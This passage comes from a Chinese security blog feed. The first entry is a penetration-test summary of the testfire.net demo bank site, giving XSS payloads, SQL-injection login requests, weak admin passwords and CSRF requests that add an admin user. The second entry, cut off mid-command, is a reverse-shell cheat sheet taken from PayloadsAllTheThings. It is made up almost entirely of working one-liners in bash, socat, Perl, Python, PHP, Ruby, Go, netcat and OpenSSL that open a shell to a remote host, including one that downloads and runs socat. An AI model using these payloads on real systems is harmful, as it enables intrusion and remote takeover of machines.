class="code"><pre><span class="line">admin admin</span><br></pre></td></tr></table></figure><h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a><code>xss</code></h4><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210426232406.png" alt="image-20210426232406401"></p><p>测试发现有xss漏洞</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210426232419.png" alt="image-20210426232419604"></p><p>payload</p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210426232502.png" alt="image-20210426232502532"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210427000311.png" alt="image-20210427000311242"></p><p>有<code>httponly</code></p><p>这个可以防范cookie盗取！ 但是还是有取它危害可以利用！ 😑</p><p>也没有<code>CSP</code></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210426233235.png" alt="image-20210426233235064"></p><p>但是读</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210426233338.png" alt="image-20210426233338449"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210426233613.png" alt="image-20210426233612988"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210426233459.png" alt="image-20210426233458908"></p><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型<code>xss</code></h4><p><code>http://www.testfire.net/feedback.jsp</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210427001255.png" alt="image-20210427001255470"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210427001327.png" alt="image-20210427001326925"></p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a><code>sql</code>注入</h4><p>数据包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;doLogin HTTP&#x2F;1.1</span><br><span class="line">Origin: http:&#x2F;&#x2F;65.61.137.117:8080</span><br><span class="line">Content-Length: 57</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Host: 65.61.137.117:8080</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;65.61.137.117:8080&#x2F;login.jsp</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Cookie: JSESSIONID&#x3D;FD515BF0B4041F280B299F5F58B86631; AltoroAccounts&#x3D;ODAwMDAwfkNvcnBvcmF0ZX41LjIzODc5OTU2MUU3fDgwMDAwMX5DaGVja2luZ34xMDA2MDguNDR8</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; U; Linux i686; de; rv:1.8.0.3) Gecko&#x2F;20060425 SUSE&#x2F;1.5.0.3-7 Firefox&#x2F;1.5.0.3</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">uid&#x3D;admin&amp;passw&#x3D;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;(1)&#x2F;**&#x2F;-- -&amp;btnSubmit&#x3D;Login</span><br></pre></td></tr></table></figure><p><code>/doLogin</code> 页面</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210426235059.png" alt="image-20210426235059094"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215220.png" alt="image-20210426235109062"></p><p>验证<code>poc</code></p><p><code>admin&#39;/**/or/**/1=1/**//**/-- -</code></p><p><code>admin&#39;/**/or/**/1=0/**//**/-- -</code></p><p>他这里应该过滤了很多东西！ </p><p>语句达不到 注入效果！ 数据库类型没判断成功！</p><p><code>cookie</code>加密算法过于简单</p><p><code>base64</code>加密</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215220.png" alt="image-20210426235959335"></p><h4 id="后台弱口令测试"><a href="#后台弱口令测试" class="headerlink" title="后台弱口令测试"></a>后台弱口令测试</h4><p>登录后台</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/doAdminLogin</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.testfire.net</span><br><span class="line"><span class="attribute">Content-Length</span>: 35</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span>: http://www.testfire.net</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://www.testfire.net/admin/login.jsp</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=7A74CF311FA64D4C998ED838FB3DCE43; AltoroAccounts=ODAwMDAwfkNvcnBvcmF0ZX41LjE5NzYyNjU2MUU3fDgwMDAwMX5DaGVja2luZ341Mzk1NTEuNDR8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">password=!Q@W#E$R%T&amp;btnSubmit=Login</span><br></pre></td></tr></table></figure><p>发现<code>302</code>跳转</p><p>有跳回原页面了！</p><p>试一试万能密码！</p><p>没成功！</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/doAdminLogin</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.testfire.net</span><br><span class="line"><span class="attribute">Content-Length</span>: 48</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span>: http://www.testfire.net</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://www.testfire.net/admin/login.jsp</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=7A74CF311FA64D4C998ED838FB3DCE43; AltoroAccounts=ODAwMDAwfkNvcnBvcmF0ZX41LjE5NzYyNjU2MUU3fDgwMDAwMX5DaGVja2luZ341Mzk1NTEuNDR8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">password=1&#x27;/**/or/**/1=1/**/-- -&amp;btnSubmit=Login</span><br></pre></td></tr></table></figure><h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a><code>csrf</code></h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/admin.jsp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.testfire.net</span><br><span class="line"><span class="attribute">Content-Length</span>: 95</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Origin</span>: http://www.testfire.net</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://www.testfire.net/admin/admin.jsp</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=7A74CF311FA64D4C998ED838FB3DCE43; AltoroAccounts=ODAwMDAwfkNvcnBvcmF0ZX41LjE5NzYyNjU2MUU3fDgwMDAwMX5DaGVja2luZ341Mzk1NTEuNDR8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">firstname=upload&amp;lastname=upload&amp;username=upload&amp;password1=123456&amp;password2=123456&amp;add=Add+User</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215220.png" alt="image-20210427153315206"></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/admin.jsp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.testfire.net</span><br><span class="line"><span class="attribute">Content-Length</span>: 71</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Origin</span>: http://www.testfire.net</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://www.testfire.net/admin/admin.jsp</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=7A74CF311FA64D4C998ED838FB3DCE43; AltoroAccounts=ODAwMDAwfkNvcnBvcmF0ZX41LjIwODg5NDM2MUU3fDgwMDAwMX5DaGVja2luZ340MjY4NzMuNDR8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">username=admin&amp;password1=123456&amp;password2=123456&amp;change=Change+Password</span><br></pre></td></tr></table></figure><p>这个<code>CSRF</code> 要先登录 ！ 但是发给管理员应该还是能利用的！</p><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>暴露路由了</p><p><code>https://65.61.137.117/swagger/index.html#/</code></p><p><code>swagger</code> 界面</p><p><code>https://65.61.137.117/swagger/index.html#/</code></p>]]></content>
    
    
    <summary type="html">渗透小结</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>各种反弹shell</title>
    <link href="http://upload.love/2021/07/17/%E5%90%84%E7%A7%8D%E5%8F%8D%E5%BC%B9shell/"/>
    <id>http://upload.love/2021/07/17/%E5%90%84%E7%A7%8D%E5%8F%8D%E5%BC%B9shell/</id>
    <published>2021-07-17T13:35:26.000Z</published>
    <updated>2021-07-17T13:55:29.003Z</updated>
    
    <content type="html"><![CDATA[<p><strong><code>PayloadsAllTheThings-master</code> github上的有个项目不错！</strong></p><h1 id="Reverse-Shell-Cheat-Sheet"><a href="#Reverse-Shell-Cheat-Sheet" class="headerlink" title="Reverse Shell Cheat Sheet"></a>Reverse Shell Cheat Sheet</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul><li><a href="#reverse-shell">Reverse Shell</a><ul><li><a href="#awk">Awk</a></li><li><a href="#revshells">Automatic Reverse Shell Generator</a></li><li><a href="#bash-tcp">Bash TCP</a></li><li><a href="#bash-udp">Bash UDP</a></li><li><a href="#c">C</a></li><li><a href="#dart">Dart</a></li><li><a href="#golang">Golang</a></li><li><a href="#groovy-alternative-1">Groovy Alternative 1</a></li><li><a href="#groovy">Groovy</a></li><li><a href="#java-alternative-1">Java Alternative 1</a></li><li><a href="#java-alternative-2">Java Alternative 2</a></li><li><a href="#java">Java</a></li><li><a href="#lua">Lua</a></li><li><a href="#ncat">Ncat</a></li><li><a href="#netcat-openbsd">Netcat OpenBsd</a></li><li><a href="#netcat-busybox">Netcat BusyBox</a></li><li><a href="#netcat-traditional">Netcat Traditional</a></li><li><a href="#nodejs">NodeJS</a></li><li><a href="#openssl">OpenSSL</a></li><li><a href="#perl">Perl</a></li><li><a href="#php">PHP</a></li><li><a href="#powershell">Powershell</a></li><li><a href="#python">Python</a></li><li><a href="#ruby">Ruby</a></li><li><a href="#socat">Socat</a></li><li><a href="#war">War</a></li></ul></li><li><a href="#meterpreter-shell">Meterpreter Shell</a><ul><li><a href="#windows-staged-reverse-tcp">Windows Staged reverse TCP</a></li><li><a href="#windows-stageless-reverse-tcp">Windows Stageless reverse TCP</a></li><li><a href="#linux-staged-reverse-tcp">Linux Staged reverse TCP</a></li><li><a href="#linux-stageless-reverse-tcp">Linux Stageless reverse TCP</a></li><li><a href="#other-platforms">Other platforms</a></li></ul></li><li><a href="#spawn-tty-shell">Spawn TTY Shell</a></li><li><a href="#references">References</a></li></ul><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><h3 id="Bash-TCP"><a href="#Bash-TCP" class="headerlink" title="Bash TCP"></a>Bash TCP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><h3 id="Bash-UDP"><a href="#Bash-UDP" class="headerlink" title="Bash UDP"></a>Bash UDP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Victim:</span><br><span class="line">sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Listener:</span><br><span class="line">nc -u -lvp 4242</span><br></pre></td></tr></table></figure><p>Don’t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p><h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">user@attack<span class="variable">$</span> socat file:`tty`,raw,<span class="built_in">echo</span>=<span class="number">0</span> TCP<span class="literal">-L</span>:<span class="number">4242</span></span><br><span class="line">user@victim<span class="variable">$</span> /tmp/socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.0</span>.<span class="number">0.1</span>:<span class="number">4242</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">user@victim<span class="variable">$</span> <span class="built_in">wget</span> <span class="literal">-q</span> https://github.com/andrew<span class="literal">-d</span>/<span class="keyword">static</span><span class="literal">-binaries</span>/raw/master/binaries/linux/x86_64/socat <span class="literal">-O</span> /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.0</span>.<span class="number">0.1</span>:<span class="number">4242</span></span><br></pre></td></tr></table></figure><p>Static socat binary can be found at <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries</a></p><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTE: Windows only</span><br><span class="line">perl -MIO -e <span class="string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>Linux only</p><p>IPv4</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">export RHOST=<span class="string">&quot;10.0.0.1&quot;</span>;export RPORT=<span class="number">4242</span>;python -c <span class="string">&#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>IPv4</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>IPv6</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p>Windows only</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Python27\python.exe <span class="literal">-c</span> <span class="string">&quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#x27;10.0.0.1&#x27;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#x27;except&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type(&#x27;try&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#x27;p2s_thread&#x27;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#x27;s2p_thread&#x27;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#x27;p&#x27;] in [(subprocess.Popen([&#x27;\\windows\\system32\\cmd.exe&#x27;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;p2s&#x27;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#x27;s&#x27;].send(__l[&#x27;p&#x27;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#x27;s&#x27;], __l[&#x27;p&#x27;] in [(s, p)]][0])(&#123;&#125;), &#x27;p2s&#x27;)]][0] for __g[&#x27;s2p&#x27;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#x27;p&#x27;].stdin.write(__l[&#x27;data&#x27;]), __after())[1] if (len(__l[&#x27;data&#x27;]) &gt; 0) else __after())(lambda: __this()) for __l[&#x27;data&#x27;] in [(__l[&#x27;s&#x27;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#x27;s&#x27;], __l[&#x27;p&#x27;] in [(s, p)]][0])(&#123;&#125;), &#x27;s2p&#x27;)]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;threading&#x27;] in [(__import__(&#x27;threading&#x27;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#x27;contextlib&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);passthru(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,4242).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);loop&#123;c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r)&#123;|io|c.print io.read&#125;))rescue c.puts &quot;failed: <span class="subst">#&#123;$_&#125;</span>&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">NOTE:</span> Windows only</span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;10.0.0.1:4242&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27;</span> &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go</span><br></pre></td></tr></table></figure><h3 id="Netcat-Traditional"><a href="#Netcat-Traditional" class="headerlink" title="Netcat Traditional"></a>Netcat Traditional</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 4242</span><br><span class="line">nc -e /bin/bash 10.0.0.1 4242</span><br><span class="line">nc -c bash 10.0.0.1 4242</span><br></pre></td></tr></table></figure><h3 id="Netcat-OpenBsd"><a href="#Netcat-OpenBsd" class="headerlink" title="Netcat OpenBsd"></a>Netcat OpenBsd</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f</span><br></pre></td></tr></table></figure><h3 id="Netcat-BusyBox"><a href="#Netcat-BusyBox" class="headerlink" title="Netcat BusyBox"></a>Netcat BusyBox</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f</span><br></pre></td></tr></table></figure><h3 id="Ncat"><a href="#Ncat" class="headerlink" title="Ncat"></a>Ncat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncat 10.0.0.1 4242 -e /bin/bash</span><br><span class="line">ncat --udp 10.0.0.1 4242 -e /bin/bash</span><br></pre></td></tr></table></figure><h3 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h3><p>Attacker:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">user@attack<span class="variable">$</span> openssl req <span class="literal">-x509</span> <span class="literal">-newkey</span> rsa:<span class="number">4096</span> <span class="literal">-keyout</span> key.pem <span class="literal">-out</span> cert.pem <span class="literal">-days</span> <span class="number">365</span> <span class="literal">-nodes</span></span><br><span class="line">user@attack<span class="variable">$</span> openssl s_server <span class="literal">-quiet</span> <span class="literal">-key</span> key.pem <span class="literal">-cert</span> cert.pem <span class="literal">-port</span> <span class="number">4242</span></span><br><span class="line">or</span><br><span class="line">user@attack<span class="variable">$</span> ncat -<span class="literal">-ssl</span> <span class="literal">-vv</span> <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">4242</span></span><br><span class="line"></span><br><span class="line">user@victim<span class="variable">$</span> mkfifo /tmp/s; /bin/sh <span class="literal">-i</span> &lt; /tmp/s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client <span class="literal">-quiet</span> <span class="literal">-connect</span> <span class="number">10.0</span>.<span class="number">0.1</span>:<span class="number">4242</span> &gt; /tmp/s; <span class="built_in">rm</span> 